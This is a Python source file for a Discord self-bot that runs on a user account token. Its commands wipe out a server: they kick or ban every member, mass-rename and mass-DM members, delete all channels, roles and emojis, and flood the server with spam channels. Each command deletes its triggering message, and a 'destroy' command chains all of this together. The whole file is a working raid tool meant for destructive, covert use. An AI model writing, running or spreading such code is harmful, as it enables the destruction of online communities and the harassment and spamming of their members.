# CONFIG
# ---------
token = "" # To find this, it's harder than it used to be. Please Google the process.
prefix = "~" # This will be used at the start of commands.
# ----------

# Import the needed libs.
from discord.ext import commands
import discord
import random

print("Loading..")

# Declare the bot, pass it a prefix and let it know to only listen to itself.
intents = discord.Intents().all()

bot = commands.Bot(command_prefix=prefix, self_bot=True, intents=intents)
bot.remove_command("help")


@bot.event
async def on_ready():
    print("Ready to be innocent.")


@bot.command()
async def kall(ctx):
    """
    Kicks every member in a server
    """
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print(f"{user.name} has been kicked from {ctx.guild.name}")

        except:
            print(f"{user.name} has FAILED to be kicked from {ctx.guild.name}")

    print("Action Completed: kall")


@bot.command()
async def ball(ctx):
    """
    Bans every member in a server
    """
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print(f"{user.name} has been banned from {ctx.guild.name}")

        except:
            print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")

    print("Action Completed: ball")


@bot.command()
async def rall(ctx, rename_to):
    """
    Renames every member in a server
    """
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.edit(nick=rename_to)
            print(f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")

        except:
            print(f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")

    print("Action Completed: rall")


@bot.command()
async def mall(ctx, *, message):
    """
    Messages every member in a server
    """
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.send(message)
            print(f"{user.name} has recieved the message.")

        except:
            print(f"{user.name} has NOT recieved the message.")

    print("Action Completed: mall")


@bot.command()
async def dall(ctx, *conditions):
    """
    Can perform multiple actions that envolve mass deleting
    """
    conditions = [condition.lower() for condition in conditions]
    if "channels" in conditions:
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print(f"{channel.name} has been deleted in {ctx.guild.name}")

            except:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")

        print("Action Completed: dall channels")

    elif "roles" in conditions:
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print(f"{role.name} has been deleted in {ctx.guild.name}")

            except:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")

        print("Action Completed: dall roles")

    elif "emojis" in conditions:
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")

            except:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

        print("Action Completed: dall emojis")

    elif "all" in conditions:
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print(f"{channel.name} has been deleted in {ctx.guild.name}")

            except:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")

        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print(f"{role.name} has been deleted in {ctx.guild.name}")

            except:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")

        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")

            except:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

        print("Action Completed: dall all")


@bot.command()
async def destroy(ctx):
    """
    Outright destroys a server
    """
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")

        except:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted in {ctx.guild.name}")

        except:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{role.name} has been deleted in {ctx.guild.name}")

        except:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")

    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print(f"{user.name} has been banned from {ctx.guild.name}")

        except:
            print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")

    print("Action Completed: destroy")

#   ==  NEW COMMANDS    ==  #
@bot.command()
async def populate(ctx, name, amount=10):
    await ctx.message.delete()
    """Create some channels..."""
    for r in range(amount):
        await ctx.message.guild.create_text_channel(name)
    print("Action Completed: populate")

@bot.command()
async def name(ctx, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
    print("Action Completed: name")

@bot.command()
async def spam(ctx, name, message, amount=10):
    await ctx.message.delete()
    for r in range(amount):
        channel = await ctx.message.guild.create_text_channel(name)
        await channel.send(message)
    print("Action Completed: spam")



bot.run(token, bot=False)  # Starts the bot by passing it a token and telling it it isn't really a bot. 
